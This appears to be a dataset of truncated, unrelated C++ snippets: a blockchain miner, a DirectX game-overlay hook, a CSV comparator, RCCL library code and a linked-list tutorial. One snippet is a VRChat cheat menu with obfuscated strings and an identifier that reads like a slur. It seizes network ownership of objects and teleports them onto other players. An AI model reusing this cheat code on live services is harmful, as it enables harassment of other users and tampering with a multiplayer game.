break;\n        }\n\n        nonce += step;  // Incr\u00e9ment par le \"pas\" donn\u00e9 \u00e0 chaque thread\n        attempts++;\n\n        // Afficher toutes les 1000 tentatives\n        if (attempts % 1000 == 0)\n        {\n            std::lock_guard<std::mutex> lock(outputMutex);\n            std::cout << \"Thread \" << std::this_thread::get_id() << \" has tried \" << attempts << \" nonces.\" << std::endl;\n        }\n    }\n}\n\nclass Block\n{\nprotected:\n    int index;\n    std::string hash;\n    std::string previousHash;\n    std::tm time;\n    std::string data;\n    int nonce;\n\npublic:\n    Block(int index, const std::string& data, Block* previousBlock = nullptr)\n        : index(index), data(data), nonce(0)\n    {\n        if (previousBlock == nullptr)\n        {\n            previousHash = \"0\";\n        }\n        else\n        {\n            previousHash = previousBlock->getHash();\n        }\n\n        std::time_t t = std::time(nullptr);\n        localtime_s(&time, &t);\n        minageBlock(1);\n    }\n\n    void minageBlock(int difficulty)\n    {\n        int numThreads = std::thread::hardware_concurrency();\n        std::vector<std::thread> threads;\n        int validNonce = -1;  // Initialisation du nonce valide\n\n        // Cr\u00e9ation de threads avec des offsets diff\u00e9rents\n        for (int i = 0; i < numThreads; ++i)\n        {\n            threads.emplace_back(mineNonce, index, previousHash, data, time, difficulty, i, numThreads, std::ref(validNonce));\n        }\n\n        // Attendre que tous les threads finissent\n        for (auto& th : threads)\n        {\n            if (th.joinable())\n                th.join();\n        }\n\n        nonce = validNonce;  // On stocke le nonce trouv\u00e9\n        hash = calculateHash(index, previousHash, data, time, nonce);\n        std::cout << \"Block mined with nonce: \" << nonce << \", hash: \" << hash << std::endl;\n    }\n\n    std::string printBlock() const\n    {\n        std::stringstream ss;\n        ss << \"Block numero : \" << index << \"\\n\";\n        ss << \"hash : \" << hash << \"\\n\";\n        ss << \"previous hash : \" << previousHash << \"\\n\";\n        ss << \"Date actuelle : \"\n            << (time.tm_year + 1900) << '-'\n            << (time.tm_mon + 1) << '-'\n            << time.tm_mday << \" \"\n            << time.tm_hour << ':' << time.tm_min << ':' << time.tm_sec << \"\\n\";\n        ss << \"donnee : \" << data << \"\\n\";\n        return ss.str();\n    }\n\n    std::string getHash() const\n    {\n        return hash;\n    }\n\n    std::string getPreviousHash() const\n    {\n        return previousHash;\n    }\n\n    void setPreviousHash(const std::string& newPreviousHash)\n    {\n        previousHash = newPreviousHash;\n    }\n\n    void updateHash()\n    {\n        hash = calculateHash(index, previousHash, data, time, nonce);\n    }\n\n    void modifData(const std::string& newData)\n    {\n        data = newData;\n        updateHash();\n    }\n\n    void corruptedBlock(const std::string& corruptedData)\n    {\n        data = corruptedData;\n        std::time_t t = std::time(nullptr);\n        localtime_s(&time, &t);\n        updateHash();\n    }\n\n    void corruptedTime(std::tm& corruptedTime)\n    {\n        time = corruptedTime;\n    }\n};\n\n\nclass Blockchain\n{\nprivate:\n    std::vector<Block> chain;\n\npublic:\n    Blockchain()\n    {\n        chain.push_back(Block(0, \"Genesis Block\"));\n    }\n\n    void addBlock(const std::string& data)\n    {\n        int index = chain.size();\n        Block* previousBlock = &chain.back();\n     ",
    "#include \"gui.h\"\n#include \"renderer.h\"\n#include \"utils.h\"\n#include \"imgui.h\"\n#include \"hooks.h\"\n#include \"preset.h\"\n#include \"script_settings.h\"\n#include \"imgui_impl_win32.h\"\n#include \"imgui_impl_dx9.h\"\n#include <unordered_map>\n#include <string>\n#include <vector>\n#include <chrono>\n#include <thread>\n#include <algorithm>\n#include <filesystem>\n\nnamespace fs = std::filesystem;\n\nstd::unordered_map<std::string, std::vector<bool>> functionSettingsAvailability;\nextern std::unordered_map<std::string, uintptr_t> hookedFunctionBaseAddresses;\n\nstatic bool showClearSettingsConfirmation = false;\n\n\n// Debounce mechanism\nstd::unordered_map<std::string, std::chrono::steady_clock::time_point> lastChangeTime;\nconst std::chrono::milliseconds debounceDelay(500); // 500ms debounce delay\n\n// Function to save setting with debounce\nvoid DebouncedSaveSetting(const std::string& section, const std::string& key, const std::variant<bool, std::string>& value) {\n    auto now = std::chrono::steady_clock::now();\n    lastChangeTime[section + \".\" + key] = now;\n\n    std::thread([section, key, value, now]() {\n        std::this_thread::sleep_for(debounceDelay);\n        if (lastChangeTime[section + \".\" + key] == now) {\n            ScriptSettings::Instance().SetSettingValue(section, key, value);\n            ScriptSettings::Instance().SaveToFile();\n            Log(\"Saved setting \" + section + \".\" + key);\n        }\n        }).detach();\n}\n\n// Function to apply saved settings\nvoid ApplySavedSettings(const std::string& funcName, const std::string& section, const std::unordered_map<std::string, SettingInfo>* settingsMap, uintptr_t baseAddress) {\n    if (!settingsMap) return;\n\n    for (const auto& [key, settingInfo] : *settingsMap) {\n        if (ScriptSettings::Instance().IsSettingSaved(section, key)) {\n            auto savedValue = ScriptSettings::Instance().GetSettingValue(section, key);\n            try {\n                std::variant<bool, int, float, std::string> parsedValue;\n\n                if (std::holds_alternative<bool>(savedValue)) {\n                    parsedValue = std::get<bool>(savedValue);\n                }\n                else {\n                    parsedValue = ParseSettingValue(settingInfo.type, std::get<std::string>(savedValue));\n                }\n\n                EditSetting(key, *settingsMap, baseAddress, parsedValue);\n                Log(\"Applied saved setting \" + section + \".\" + key);\n            }\n            catch (const std::exception& e) {\n                Log(\"Error applying saved setting \" + section + \".\" + key + \": \" + e.what());\n            }\n        }\n    }\n}\n\nstatic bool imguiInitialized = false;\nstatic bool showImGui = false;\nstatic HWND hWnd = NULL;\nstatic WNDPROC oWndProc = NULL;\n\nD3DPRESENT_PARAMETERS g_d3dpp;\n\nextern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);\n\nbool IsGUIInitialized() {\n    return imguiInitialized;\n}\n\nvoid LoadRenderSettings() {\n    ScriptSettings& settings = ScriptSettings::Instance();\n    void* rendererAddress = GetRendererStructureAddress();\n\n    if (!rendererAddress) {\n        Log(\"Renderer structure address not available. Cannot apply render settings.\");\n        return;\n    }\n\n    for (const auto& [type, info] : toggles) {\n        auto value = settings.GetSettingValue(\"RenderSettings\", info.name, ReadBoolValue(info.offset));\n        if (std::holds_alternative<bool>(value)) {\n            WriteBoolValue(info.offset, std::get<bool>(value));\n            Log(\"Applied \" + std::string(info.name) + \" setting: \" + (std::get<bool>(value) ? \"true\" : \"false\"));\n        }\n    }\n}\n\nvoid InitializeGUI(LPDIRECT3DDEVICE9 pDevice) {\n    D3DDEVICE_CREATION_PARAMETERS params;\n    pDevice->GetCreationParameters(&params);\n    hWnd = params.hFocusWindow;\n\n    ImGui::CreateContext();\n    ImGuiIO& io = ImGui::GetIO();\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;\n    io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange;\n\n    oWndProc = (WNDPROC)SetWindowLongPtr(hWnd, GWLP_WNDPROC, (LONG_PTR)WndProc);\n\n    ImGui_ImplWin32_Init(hWnd);\n    ImGui_ImplDX9_Init(pDevice);\n\n    LoadRenderSettings();\n\n    imguiInitialized = true;\n}\n\nvoid RenderGUI(LPDIRECT3DDEVICE9 pDevice) {\n    HRESULT hr = pDevice->TestCooperativeLevel();\n    if (hr != D3D_OK) {\n        // Device is lost, skip rendering\n        return;\n    }\n\n    ImGui_ImplDX9_NewFrame();\n    ImGui_ImplWin32_NewFrame();\n    ImGui::NewFrame();\n\n    if (showImGui) {\n        DrawImGuiInterface();\n    }\n\n    ImGui::EndFrame();\n    ImGui::Render();\n    ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());\n}\n\nvoid CleanupGUI() {\n    Log(\"Cleaning up GUI\");\n    if (imguiInitialized) {\n        ImGui_ImplWin32_Shutdown();\n        if (oWndProc && hWnd) {\n            SetWindowLongPtr(hWnd, GWLP_WNDPROC, (LONG_PTR)oWndProc);\n        }\n        imguiInitialized = false;\n        showImGui = false;\n        hWnd = NULL;\n        oWndProc = NULL;\n    }\n    Log(\"GUI cleanup completed\");\n}\n\nLRESULT CALLBACK WndProc(HWND hWnd,",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include<string>\n#include <set>\n#include<algorithm>\n#include <vector>\n#include \"../include/csvfile.h\"\n#include \"../include/comparator.h\"\nusing namespace std;\n\nComparison::Comparison(bool success, const string &message) : success(success), message(message) {\n}\n\nbool Comparison::isSuccess() { return success; }\nconst string &Comparison::getMessage() { return message; }\nvoid Comparison::printResult() { cout << (success ? \"SUCCESS\" : \"FAILURE\") << message << endl; }\n\nComparator::Comparator(const CSVFile &file1, const CSVFile &file2) : file1(file1), file2(file2) {\n}\n\nComparison Comparator::compare_headers() {\n    if (file1.get_headers() == file2.get_headers()) {\n        return Comparison(true, \"  Headers are matching\");\n    }\n    return Comparison(false, \"  Headers are not matching\");\n}\n\nComparison Comparator::compare_rowcount() {\n    if (file1.get_rowCount() == file2.get_rowCount()) {\n        return Comparison(true, \"  Row counts are matching\");\n    }\n    return Comparison(false, \"  Row counts are not matching\");\n}\n\nComparison Comparator::compare_column_count() {\n    if (file1.get_columnCount() == file2.get_columnCount()) {\n        return Comparison(true, \"  Column counts  are matching\");\n    }\n    return Comparison(false, \"  Column counts are not matching\");\n}\n\nComparison Comparator::compare_cell_data() {\n    if (file1.get_columnCount() != file2.get_columnCount() || file1.get_rowCount() != file2.get_rowCount()) {\n        return Comparison(false, \"  Row or colums are not matching\");\n    }\n    for (size_t i = 0; i < file1.get_rowCount(); ++i) {\n        const auto &row_from_file1 = file1.getData()[i];\n        const auto &row_from_file2 = file2.getData()[i];\n        for (size_t j = 0; j < row_from_file1.size(); ++j) {\n            if (row_from_file1[j] != row_from_file2[j]) {\n                return Comparison(false, \"  Mismatch found at row \" + to_string(i) + \",column\" + to_string(j) + \".\");\n            }\n        }\n        return Comparison(true, \"  All cells are matching\");\n    }\n}\n\nComparison Comparator::compare_missing_values() {\n    vector<vector<string> > data1 = file1.getData();\n    vector<vector<string> > data2 = file2.getData();\n    bool missing_values = false;\n    string missing_details;\n    // Check file1 for missing or null values\n    for (size_t i = 0; i < data1.size(); ++i) {\n        for (size_t j = 0; j < data1[i].size(); ++j) {\n            if (data1[i][j].empty()) {\n                missing_values = true;\n                //missing_details += \" Missing value found in file1 at row \" + to_string(i) + \", column \" + to_string(j) + \"   \";\n            }\n        }\n    }\n    // Check file2 for missing or null values\n    for (size_t i = 0; i < data2.size(); ++i) {\n        for (size_t j = 0; j < data2[i].size(); ++j) {\n            if (data2[i][j].empty()) {\n                missing_values = true;\n                // missing_details += \"\\nMissing value found in file2 at row \" + to_string(i) + \", column \" + to_string(j) + \"\";\n            }\n        }\n    }\n    if (missing_values) {\n        return Comparison(false, \"  Missing or null values detected\" + missing_details);\n    } else {\n        return Comparison(true, \"  No missing or null values detected in the files.\");\n    }\n}\n\nComparison Comparator::detect_duplicate_rows() {\n    set<vector<string> > file1_rows; //hash to track file1 rows\n    for (auto &row: file1.getData())\n        file1_rows.insert(row);\n    bool duplicate_rows = false;\n\n    // Check file2 for duplicate occurences\n    for (auto &row: file2.getData()) {\n        if (file1_rows.find(row) != file1_rows.end()) {\n            duplicate_rows = true;\n            //for (size_t j = 0; j < row.size(); ++j) {\n            //cout<<\"duplicates are \"+row[j]+\";\"<<endl;\n            // }\n        }\n\n        if (duplicate_rows) {\n            return Comparison(false, \"  Duplicate rows detected in the files.\");\n        } else {\n            return Comparison(true, \"  Duplicate rows not detected in the files.\");\n        }\n    }\n}\n\n\nComparison Comparator::detect_empty_file() {\n    // Check if file1 is empty\n    if (file1.get_rowCount() == 0 || file1.get_columnCount() == 0) {\n        return Comparison(false, \"  File1 is empty.\");\n    }\n\n    // Check if file2 is empty\n    if (file2.get_rowCount() == 0 || file2.get_columnCount() == 0) {\n        return Comparison(false, \"  File2 is empty.\");\n    }\n\n    return Comparison(true, \"  Neither file is empty.\");\n}\n",
    "#include \"PlayerList.hpp\"\n#include \"../imgui_helper.hpp\"\n#include \"SetManager.hpp\"\n#include \"../imgui_custom.hpp\"\n#include \"../Menu.hpp\"\n\n#include <Windows.h>\n#include <Globals.hpp>\n\nnamespace Functions_t {\n\tnamespace Game {\n\t\tnamespace VRChatSDKBasePlayerAPI {\n\t\t\tvoid TakeOwnership(VRC_SDKBase_VRCPlayerApi_o* Plr, UnityEngine_GameObject_o* Obj);\n\t\t\tvoid TakeOwnership(VRC_SDKBase_VRCPlayerApi_o* Plr, Unity::CGameObject* Obj);\n\t\t}\n\t\tnamespace VRChatSDKBaseNetworking {\n\t\t\tvoid SetOwner(VRC_SDKBase_VRCPlayerApi_o* Plr, UnityEngine_GameObject_o* Obj);\n\t\t\tvoid SetOwner(VRC_SDKBase_VRCPlayerApi_o* Plr, Unity::CGameObject* Obj);\n\t\t}\n\t\tnamespace VRCSDK2ObjectSync {\n\t\t\tvoid TakeOwnership(Unity::CComponent* Obj, VRC_SDKBase_VRCPlayerApi_o* Plr);\n\t\t\tvoid TakeOwnership(VRCSDK2_VRC_ObjectSync_o* Obj, VRC_SDKBase_VRCPlayerApi_o* Plr);\n\t\t}\n\t}\n}\n\nMenuPlayerList::MenuPlayerList() : Module(obf(\"MenuPlayerList\"), obf(\"\")) {\n\tiOrbitspeed = &SetManager::i().add(new Set(1.0f, 1.0f, 50.f, obf(\"iOrbitspeed\"), getName())).getVec3f();\n\tpOrbitspeed = &SetManager::i().add(new Set(1.0f, 1.0f, 50.f, obf(\"pOrbitspeed\"), getName())).getVec3f();\n}\n\nvoid MenuPlayerList::renderList() {\n\tstatic int player_current_idx = 0;\n\tif (ImGui::BeginListBox(nignog1(\"##PlayerList\"), ImVec2(-FLT_MIN, ImGuiHelper::getHeight())))\n\t{\n\t\tif (PlayerList.size() > 0)\n\t\t{\n\t\t\tfor (int i = 0; i < PlayerList.size(); i++)\n\t\t\t{\n\t\t\t\tif (!PlayerList[i])\n\t\t\t\t\tcontinue;\n\t\t\t\tconst bool is_selected = (player_current_idx == i);\n\n\t\t\t\tint photonID = PlayerList[i]->get_photon_id();\n\t\t\t\tstd::string photonIDString = \"[\" + std::to_string(photonID) + \"] \";\n\n\t\t\t\tauto PlayerName = (Unity::System_String*)PlayerList[i]->OriginalName;\n\t\t\t\tauto PlayerNameStr = PlayerName->ToString();\n\n\t\t\t\tstd::string playerNameWithID = photonIDString + PlayerNameStr;\n\n\t\t\t\tif (ImGui::Selectable(playerNameWithID.c_str(), is_selected))\n\t\t\t\t{\n\t\t\t\t\tplayer_current_idx = i;\n\t\t\t\t\tselectedPlayer = i;\n\t\t\t\t}\n\n\t\t\t\tif (is_selected)\n\t\t\t\t\tImGui::SetItemDefaultFocus();\n\t\t\t}\n\t\t}\n\t\tImGui::EndListBox();\n\t}\n}\n\nvoid MenuPlayerList::renderOptions() {\n\tif (ImGui::Button(nignog1(\"Bring Objects To Selected\")))\n\t{\n\t\tauto LocalFromAPI = APILocalPlayer;\n\t\tauto list = Unity::Object::FindObjectsOfType<Unity::CComponent>(nignog1(\"VRC.SDK3.Components.VRCPickup\"));\n\t\tfor (int i = 0; i < list->m_uMaxLength; i++)\n\t\t{\n\t\t\tif (!list->operator[](i)) {\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tif (PlayerList[selectedPlayer]->GameObj && PlayerList[selectedPlayer]->VRCPlayerAPI && LocalFromAPI) {\n\t\t\t\tauto PlrObj = PlayerList[selectedPlayer]->GameObj;\n\t\t\t\tauto PlrPos = PlrObj->GetTransform()->GetPosition();\n\t\t\t\tauto ActualObj = (VRC_SDK3_Components_VRCPickup_o*)list->operator[](i);\n\t\t\t\tauto GameObj = list->operator[](i)->GetGameObject();\n\n\t\t\t\t// Even though we are teleporting it to someone else, we need to take ownership so the game recognizes where it is on our client and sends to server.\n\t\t\t\tFunctions_t::Game::VRChatSDKBasePlayerAPI::TakeOwnership(LocalFromAPI, GameObj);\n\t\t\t\tFunctions_t::Game::VRChatSDKBaseNetworking::SetOwner(LocalFromAPI, GameObj);\n\n\t\t\t\tGameObj->GetTransform()->SetLocalPosition(Unity::Vector3(PlrPos.x, PlrPos.y + 0.5f, PlrPos.z));\n\t\t\t\tGameObj->GetTransform()->SetPosition(Unity::Vector3(PlrPos.x, PlrPos.y + 0.5f, PlrPos.z));\n\t\t\t}\n\t\t}\n\t}\n\n\tif (ImGui::Button(nignog1(\"Bring SyncedObjects To Selected\")))\n\t{\n\t\tauto LocalFromAPI = APILocalPlayer;\n\t\tauto list = Unity::Object::FindObjectsOfType<Unity::CComponent>(nignog1(\"VRC.SDK3.Components.VRCObjectSync\"));\n\t\tfor (int i = 0; i < list->m_uMaxLength + 1; i++) {\n\t\t\tif (!list->operator[](i))\n\t\t\t\tcontinue;\n\n\t\t\tauto GameObj = list->operator[](i)->GetGameObject();\n\n\t\t\tif (!GameObj)\n\t\t\t\tcontinue;\n\n\t\t\tif (PlayerList[selectedPlayer]->GameObj && PlayerList[selectedPlayer]->VRCPlayerAPI && LocalFromAPI) {\n\t\t\t\tauto PlrObj = PlayerList[selectedPlayer]->GameObj;\n\t\t\t\tauto PlrPos = PlrObj->GetTransform()->GetPosition();\n\t\t\t\tauto ActualObj = (VRC_SDK3_Components_VRCObjectSync_o*)list->operator[](i);\n\t\t\t\tauto GameObj = list->operator[](i)->GetGameObject();\n\n\t\t\t\tFunctions_t::Game::VRChatSDKBasePlayerAPI::TakeOwnership(LocalFromAPI, GameObj);\n\t\t\t\tFunctions_t::Game::VRChatSDKBaseNetworking::SetOwner(LocalFromAPI, GameObj);\n\t\t\t\tActualObj->fields.AllowCollisionOwnershipTransfer = true;\n\n\t\t\t\tGameObj->GetTransform()->SetLocalPosition(Unity::Vector3(PlrPos.x, PlrPos.y + 0.5f, PlrPos.z));\n\t\t\t\tGameObj->GetTransform()->SetPosition(Unity::Vector3(PlrPos.x, PlrPos.y + 0.5f, PlrPos.z));\n\t\t\t}\n\t\t}\n\t\tauto list2 = Unity::Object::FindObjectsOfType<Unity::CComponent>(nignog1(\"VRCSDK2.VRC_ObjectSync\"));\n\t\tfor (int i = 0; i < list2->m_uMaxLength + 1; i++) {\n\t\t\tif (!list2->operator[](i))\n\t\t\t\tcontinue;\n\n\t\t\tauto GameObj = list2->operator[](i)->GetGameObject();\n\n\t\t\tif (!GameObj)\n\t\t\t\tcontinue;\n\n\t\t\tif (PlayerList[selectedPlayer]->GameObj && PlayerList[selectedPlayer]->VRCPlayerAPI && LocalFromAPI) {\n\t\t\t\tauto PlrObj = PlayerList[selectedPlayer]->GameObj;\n\t\t\t\tauto PlrPos = PlrObj->GetTransform()->GetPosition();\n\t\t\t\tauto GameObj = list2->operator[](i)",
    "/*************************************************************************\n * Copyright (c) 2015-2022, NVIDIA CORPORATION. All rights reserved.\n * Modifications Copyright (c) 2019-2023 Advanced Micro Devices, Inc. All rights reserved.\n *\n * See LICENSE.txt for license information\n ************************************************************************/\n\n#include \"nccl.h\"\n#include \"channel.h\"\n#include \"nvmlwrap.h\"\n#include \"bootstrap.h\"\n#include \"transport.h\"\n#include \"group.h\"\n#include \"net.h\"\n#include \"graph.h\"\n#include \"argcheck.h\"\n#include <sched.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <hip/hip_runtime.h>\n#include <string.h>\n#include <errno.h>\n#include <assert.h>\n#include <dlfcn.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <unistd.h>\n#include <cstdarg>\n#include \"xml.h\"\n#include \"coll_net.h\"\n#include \"model.h\"\n#include \"utils.h\"\n#include \"rocm_smi/rocm_smi.h\"\n\nconst char* ncclFuncStr[NCCL_NUM_FUNCTIONS+2] = { \"Broadcast\", \"Reduce\", \"AllGather\", \"ReduceScatter\", \"AllReduce\", \"SendRecv\", \"AllToAllPivot\" };\nconst char* ncclAlgoStr[NCCL_NUM_ALGORITHMS] = { \"Tree\", \"Ring\", \"CollNetDirect\", \"CollNetChain\" };\nconst char* ncclProtoStr[NCCL_NUM_PROTOCOLS] = { \"LL\", \"LL128\", \"Simple\" };\n\nextern NodeModel *node_model;\n\nRCCL_PARAM(CliqueIgnoreTopo, \"CLIQUE_IGNORE_TOPO\", 0);\nRCCL_PARAM(P2pNetDisable, \"P2P_NET_DISABLE\", 0);\nRCCL_PARAM(PivotAlltoallEnable, \"PIVOT_ALLTOALL_ENABLE\", 1);\nRCCL_PARAM(LL128ForceEnable, \"LL128_FORCE_ENABLE\", 0);\n\nNCCL_PARAM(GraphDumpFileRank, \"GRAPH_DUMP_FILE_RANK\", 0);\nNCCL_PARAM(CollNetNodeThreshold, \"COLLNET_NODE_THRESHOLD\", 2);\nNCCL_PARAM(NvbPreconnect, \"NVB_PRECONNECT\", 0);\nNCCL_PARAM(AllocP2pNetLLBuffers, \"ALLOC_P2P_NET_LL_BUFFERS\", 0);\n\nthread_local int ncclDebugNoWarn = 0;\nncclCollNet_t* ncclCollNet = NULL;\n\n// Get current Compute Capability\nint ncclCudaCompCap() {\n  int ccMajor = 1, ccMinor = 0;\n  return ccMajor*10+ccMinor;\n}\n\nncclResult_t int64ToBusId(int64_t id, char* busId) {\n  sprintf(busId, \"%04lx:%02lx:%02lx.%01lx\", (id) >> 20, (id & 0xff000) >> 12, (id & 0xff0) >> 4, (id & 0xf));\n  return ncclSuccess;\n}\n\nncclResult_t busIdToInt64(const char* busId, int64_t* id) {\n  const int size = strlen(busId);\n  char* hexStr;\n  NCCLCHECK(ncclCalloc(&hexStr, size));\n  int hexOffset = 0;\n  for (int i=0; i<size; i++) {\n    char c = busId[i];\n    if (c == '.' || c == ':') continue;\n    if ((c >= '0' && c <= '9') ||\n        (c >= 'A' && c <= 'F') ||\n        (c >= 'a' && c <= 'f')) {\n      hexStr[hexOffset++] = busId[i];\n    } else break;\n  }\n  hexStr[hexOffset] = '\\0';\n  *id = strtol(hexStr, NULL, 16);\n  free(hexStr);\n  return ncclSuccess;\n}\n\nvoid* ncclMemoryStack::allocateSpilled(struct ncclMemoryStack* me, size_t size, size_t align) {\n  // `me->hunks` points to the top of the stack non-empty hunks. Hunks above\n  // this (reachable via `->above`) are empty.\n  struct Hunk* top = me->topFrame.hunk;\n  size_t mallocSize = 0;\n\n  // If we have lots of space left in hunk but that wasn't enough then we'll\n  // allocate the object unhunked.\n  if (me->topFrame.end - me->topFrame.bumper >= 8<<10)\n    goto unhunked;\n\n  // If we have another hunk (which must be empty) waiting above this one and\n  // the object fits then use that.\n  if (top && top->above) {\n    struct Hunk* top1 = top->above;\n    uintptr_t uobj = (reinterpret_cast<uintptr_t>(top1) + sizeof(struct Hunk) + align-1) & -uintptr_t(align);\n    if (uobj + size <= reinterpret_cast<uintptr_t>(top1) + top1->size) {\n      me->topFrame.hunk = top1;\n      me->topFrame.bumper = uobj + size;\n      me->topFrame.end = reinterpret_cast<uintptr_t>(top1) + top1->size;\n      return reinterpret_cast<void*>(uobj);\n    }\n  }\n\n  { // If the next hunk we're going to allocate wouldn't be big enough but the\n    // Unhunk proxy fits in the current hunk then go allocate as unhunked.\n    size_t nextSize = (top ? top->size : 0) + (64<<10);\n    constexpr size_t maxAlign = 64;\n    if (nextSize < sizeof(struct Hunk) + maxAlign + size) {\n      uintptr_t uproxy = (me->topFrame.bumper + alignof(Unhunk)-1) & -uintptr_t(alignof(Unhunk));\n      if (uproxy + sizeof(struct Unhunk) <= me->topFrame.end)\n        goto unhunked;\n    }\n\n    // At this point we must need another hunk, either to fit the object\n    // itself or its Unhunk proxy.\n    mallocSize = nextSize;\n    INFO(NCCL_ALLOC, \"%s:%d memory stack hunk malloc(%llu)\", __FILE__, __LINE__, (unsigned long long)mallocSize);\n    struct Hunk *top1 = (struct Hunk*)malloc(mallocSize);\n    if (top1 == nullptr) goto malloc_exhausted;\n    top1->size = nextSize;\n    top1->above = nullptr;\n    if (top) top->above = top1;\n    top = top1;\n    me->topFrame.hunk = top;\n    me->topFrame.end = reinterpret_cast<uintptr_t>(top) + nextSize;\n    me->topFrame.bumper = reinterpret_cast<uintptr_t>(top) + sizeof(struct Hunk);\n  }\n\n  { // Try to fit object in the new top hunk.\n    uintptr_t uobj = (me->topFrame.bumper + align-1) & -uintptr_t(align);\n    if (uobj + size <= me->topFrame.end) {\n      me->topFrame.bumper = uobj + size;\n ",
    "#include<iostream>\r\nusing namespace std;\r\n\r\ntypedef int ElemType;//\u81ea\u5b9a\u4e49\u94fe\u8868\u6570\u636e\u5143\u7d20\u4e3a\u6574\u6570\r\n\r\nstruct LNode\r\n{\r\n\tElemType data;\r\n\tLNode* next;\r\n};\r\n/*typedef struct LNode\r\n{\r\n\tElemType data;\r\n\tLNode* next;\r\n}*Pointer;*/\r\n//\u521d\u59cb\u5316\u94fe\u8868\uff0c\u8fd4\u56de\u503c\uff1a\u5931\u8d25\u8fd4\u56denullptr\uff0c\u6210\u529f\u8fd4\u56de\u5934\u7ed3\u70b9\u5730\u5740\r\nLNode* InitList()\r\n{\r\n\tLNode* head = new LNode;//\u5206\u914d\u5934\u7ed3\u70b9\r\n\tif (head == nullptr)\r\n\t{\r\n\t\treturn nullptr;//\u5185\u5b58\u4e0d\u8db3\uff0c\u8fd4\u56de\u5931\u8d25\r\n\t}\r\n\thead->next = nullptr;\r\n\treturn head;\r\n}\r\n//\u9500\u6bc1\u94fe\u8868\r\nvoid DestroyList(LNode* head)\r\n{\r\n\tLNode* tmp;\r\n\r\n\twhile (head != nullptr)\r\n\t{\r\n\t\ttmp = head->next;//trmp\u4fdd\u5b58\u4e0b\u4e00\u7ed3\u70b9\u7684\u5730\u5740\r\n\t\tdelete head;//\u91ca\u653e\u5f53\u524d\u7ed3\u70b9\r\n\t\thead = tmp;//\u6307\u9488\u79fb\u52a8\u5230\u4e0b\u4e00\u7ed3\u70b9\r\n\t}\r\n}\r\n//\u5934\u63d2\u6cd5\uff0c\u8fd4\u56de\u503c\uff1afalse\u5931\u8d25\uff0ctrue\u6210\u529f\r\nbool PushFront(LNode* head, const ElemType& ee)\r\n{\r\n\tif (head == nullptr)\r\n\t{\r\n\t\tcout << \"\u94fe\u8868\u4e0d\u5b58\u5728\" << endl;\r\n\t}\r\n\tLNode* tmp = new LNode;//\u5206\u914d\u65b0\u7ed3\u70b9\r\n\tif (tmp == nullptr)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\ttmp->data = ee;//\u8f93\u5165\u503c\u5b58\u5165\u65b0\u7ed3\u70b9\r\n\t//\u5904\u7406next\u6307\u9488\r\n\ttmp->next = head->next;\r\n\thead->next = tmp;\r\n\r\n\treturn true;\r\n}\r\n//\u5c3e\u63d2\u6cd5\uff08\u5728\u5c3e\u90e8\u63d2\u5165\u5143\u7d20\uff09\r\nbool PushBack(LNode* head, const ElemType& ee)\r\n{\r\n\tif (head == nullptr)\r\n\t{\r\n\t\tcout << \"\u94fe\u8868\u4e0d\u5b58\u5728\" << endl;\r\n\t}\r\n\tLNode* p = head;//\u4ece\u5934\u7ed3\u70b9\u5f00\u59cb\r\n\r\n\t//\u627e\u5230\u6700\u540e\u4e00\u4e2a\u7ed3\u70b9\uff0cp\u6307\u5411\u5c3e\u7ed3\u70b9\r\n\twhile (p->next != nullptr)\r\n\t{\r\n\t\tp = p->next;\r\n\t}\r\n\tLNode* tmp = new LNode;//\u5206\u914d\u65b0\u7ed3\u70b9\r\n\tif (tmp == nullptr)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\ttmp->data = ee;//\u8f93\u5165\u503c\u5b58\u5165\u65b0\u7ed3\u70b9\r\n\t//\u5904\u7406next\u6307\u9488\r\n\ttmp->next = nullptr;\r\n\tp->next = tmp;\r\n\r\n\treturn true;\r\n}\r\n//\u663e\u793a\u94fe\u8868\u4e2d\u5168\u90e8\u5143\u7d20\r\nvoid PrintList(const LNode* head)\r\n{\r\n\tif (head == nullptr)\r\n\t{\r\n\t\tcout << \"\u94fe\u8868\u4e0d\u5b58\u5728\" << endl;\r\n\t\treturn;\r\n\t}\r\n\tLNode* p = head->next;//\u7b2c\u4e00\u4e2a\u7ed3\u70b9\u5f00\u59cb\r\n\tcout << \"\u94fe\u8868\u4e3a\uff1a\";\r\n\twhile (p != nullptr)\r\n\t{\r\n\t\tcout << p->data << \" \";//\u5982\u679c\u5143\u7d20\u4e3a\u7ed3\u6784\u4f53\uff0c\u8fd9\u884c\u4ee3\u7801\u8981\u4fee\u6539\r\n\t\tp = p->next;//\u6307\u9488\u5411\u540e\u79fb\u52a8\u4e00\u4e2a\u7ed3\u70b9\r\n\t}\r\n\tcout << endl;\r\n}\r\n//\u6c42\u94fe\u8868\u8868\u957f\uff0c\u8fd4\u56de\u503c\uff1a\u8868\u7ed3\u70b9\u4e2a\u6570\r\nsize_t ListLength(LNode* head)//size_t \u7c7b\u578b\u8868\u793aC\u4e2d\u4efb\u4f55\u5bf9\u8c61\u6240\u80fd\u8fbe\u5230\u7684\u6700\u5927\u957f\u5ea6\uff0c\u5b83\u662f\u65e0\u7b26\u53f7\u6574\u6570,\u4e00\u5b9a\u8981\u7ed9\u8fd9\u79cd\u7c7b\u578b\u7684\u53d8\u91cf\u8d4b\u6b63\u6570\r\n{\r\n\tif (head == nullptr)\r\n\t{\r\n\t\tcout << \"\u94fe\u8868\u4e0d\u5b58\u5728\" << endl;\r\n\t\treturn 0;\r\n\t}\r\n\tLNode* p = head->next;\r\n\tsize_t length = 0;\r\n\twhile (p != nullptr)\r\n\t{\r\n\t\tlength++;\r\n\t\tp = p->next;\r\n\t}\r\n\treturn length;\r\n\t/*\u4e0d\u4f7f\u7528\u4e34\u65f6\u53d8\u91cfp\uff1a\r\n\tif (head == nullptr)return 0;\r\n\treturn ListLength(head->next) + 1;\r\n\t*/\r\n}\r\n//\u5220\u9664\u94fe\u8868\u7b2c\u4e00\u4e2a\u7ed3\u70b9\r\nint PopFront(LNode* head)\r\n{\r\n\tif (head == 